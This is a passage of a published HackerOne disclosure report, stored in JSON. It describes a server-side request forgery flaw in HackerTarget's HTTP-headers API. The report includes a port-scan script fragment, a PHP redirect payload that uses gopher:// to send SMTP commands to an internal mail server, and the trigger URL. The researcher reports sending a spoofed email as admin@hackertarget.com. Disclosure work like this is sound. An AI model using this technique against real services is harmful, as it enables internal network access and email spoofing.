-e <span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span>\n<span class=\"k\">done</span>\n</code></pre><pre class=\"highlight plaintext\"><code>\u279c cdl@skid   ~ chmod +x ht.sh &amp;&amp; ./ht.sh 0177.1\n</code></pre>\n<p>This spat out the following response: </p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ht-postfix.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221805Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9242546c98ebe0693592243a3c1f0f1f8b3062bf5b86c9bc6bedfd45eadc9ae7\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221805Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9242546c98ebe0693592243a3c1f0f1f8b3062bf5b86c9bc6bedfd45eadc9ae7\" class=\"markdown-inline-image\"></a></p>\n\n<p>There was an internal SMTP server running on the standard port.</p>\n\n<p><strong>SMTP:</strong></p>\n\n<ul>\n<li>  SMTP stands for Simple Mail Transfer Protocol.</li>\n<li> It is a TCP/IP protocol that\u2019s used for <strong>sending emails</strong>.</li>\n</ul>\n\n<p>In order to be able to send emails with SMTP we have to first have to know how mail transactions work:</p>\n\n<ol>\n<li>SMTP sessions are initiated after the <strong>client</strong> opens a TCP/IP connection to the server and the <strong>server</strong> responds with a greeting (220)</li>\n<li>The <strong>client</strong> sends a <code>HELO</code> or <code>EHLO</code> with the clients identity (example: <code>HELO hackertarget.com</code> which means &quot;Hi I&#39;m hackertarget.com&quot;)</li>\n<li>Now the client has to perform 3 steps each separated by a <strong>CRLF</strong> for a valid SMTP mail transaction:\n\n<ul>\n<li>Step 1: <code>MAIL</code>: This tells the server &quot;Hey, we&#39;re starting a new email, reset your state&quot;. This is where the email &quot;from&quot; is specified.</li>\n<li>Step 2: <code>RCPT</code>: Tells the server where (who) we want to send the email too.</li>\n<li>Step 3: <code>DATA</code>: This is where the Subject and body of the email are set, and the client indicates the end of the mail data by a new line containing only &quot;.&quot;. This tells the server that the client confirms the email and tells the server to process it and send it.</li>\n</ul>\n</li>\n</ol>\n\n<p>Here&#39;s a visualization of the structure of SMTP from <a href=\"/redirect?signature=d1d5ee5672f08b6dfb21f371ec480cb9e7f524aa&amp;url=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc5321\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>RFC 5321</span><i class=\"icon-external-link\"></i></a>:</p>\n<pre class=\"highlight plaintext\"><code>                  +----------+                +----------+\n      +------+    |          |                |          |\n      | User |&lt;--&gt;|          |      SMTP      |          |\n      +------+    |  Client- |Commands/Replies| Server-  |\n      +------+    |   SMTP   |&lt;--------------&gt;|    SMTP  |    +------+\n      | File |&lt;--&gt;|          |    and Mail    |          |&lt;--&gt;| File |\n      |System|    |          |                |          |    |System|\n      +------+    +----------+                +----------+    +------+\n                            Email client                     SMTP server\n</code></pre>\n<p>The SMTP Client was the &quot;Get HTTP Headers&quot; function of the API and the the SMTP Server was the service running on an internal port.</p>\n\n<h1 id=\"leveraging-the-ssrf-to-send-emails\">Leveraging the SSRF to send emails:</h1>\n\n<p>The API function was using libcurl to execute the requests <em>and</em> it was following redirects. The libcurl library supports an overabundance of protocols including <code>gopher://</code> which essentially sends 1 character, a new line (CR+LF), and the remaining data, which allows people to send a multiline requests. This means we can use gopher to send valid commands to the SMTP server and send emails.</p>\n\n<ul>\n<li>http://&lt;server&gt;/mail.php:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n        $commands = array(\n                &#39;HELO hackertarget.com&#39;,\n                &#39;MAIL FROM: &lt;admin@hackertarget.com&gt;&#39;,\n                &#39;RCPT To: &lt;cdl@oou.us&gt;&#39;,\n                &#39;DATA&#39;,\n                &#39;Subject: corben!&#39;,\n                &#39;Corben (cdl) was here, woot woot!&#39;,\n                &#39;.&#39;\n        );\n\n        $payload = implode(&#39;%0A&#39;, $commands);\n\n        header(&#39;Location: gopher://0:25/_&#39;.$payload);\n?&gt;\n</code></pre>\n<p>This responds with a 302 redirect to the internal SMTP server with the valid commands to send an email.</p>\n\n<p>I confirmed it worked by visiting the following URL:</p>\n\n<ul>\n<li>\n<a title=\"https://api.hackertarget.com/httpheaders/?q=http://\" href=\"/redirect?signature=e8b1be4e8f2d40e0330548f8d65c75c3b6235a4c&amp;url=https%3A%2F%2Fapi.hackertarget.com%2Fhttpheaders%2F%3Fq%3Dhttp%3A%2F%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://api.hackertarget.com/httpheaders/?q=http://</span><i class=\"icon-external-link\"></i></a>&lt;server&gt;/mail.php </li>\n</ul>\n\n<p>I checked my email (<a title=\"cdl@oou.us\" href=\"mailto:cdl@oou.us\" rel=\"nofollow noopener noreferrer\">cdl@oou.us</a>) and I had an email from <code>admin@hackertarget.com</code> with the subject &quot;corben!&quot; and the body &quot;Corben (cdl) was here, woot woot!&quot;</p>\n\n<p>Here&#39;s the proof-of-concept video:</p>\n\n<ul>\n<li><a title=\"https://www.youtube.com/watch?v=F_sC_OrSkIc\" href=\"/redirect?signature=c6d0d930b8fe204553c76144ce55938dd5cf2b1a&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DF_sC_OrSkIc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.youtube.com/watch?v=F_sC_OrSkIc</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<table>\n<thead>\n<tr>\n<th>Impact</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n\n<p>An attacker could access internal networks and internal services. I could have sent valid emails from and as HackerTarget.</p>\n\n<p>Thanks,<br>\nCorben Leo (@cdl)</p>\n\n<ul>\n<li><a title=\"https://hacking.us.com\" href=\"/redirect?signature=036594cec0e201cd165c3d463e46306ab9461232&amp;url=https%3A%2F%2Fhacking.us.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://hacking.us.com</span><i class=\"icon-external-link\"></i></a></li>\n<li><a title=\"https://twitter.com/hacker_\" href=\"/redirect?signature=68198466cc9f0c961b2c00a5768212fd9a8494fc&amp;url=https%3A%2F%2Ftwitter.com%2Fhacker_\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://twitter.com/hacker_</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://hackertarget.com", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "Hacker Target"
+        }, 
+        "handle": "hackertarget", 
+        "url": "https://hackerone.com/hackertarget", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/031/821/8480035e6ec7fd92c9b7d9fbe9ae9344d366da28_small.?1533890469", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/031/821/ee4a8a9c094ef01cc61642874e239ef1620a3349_medium.?1533890469"
+        }, 
+        "id": 31821, 
+        "permissions": []
+    }, 
+    "is_published": true
+}
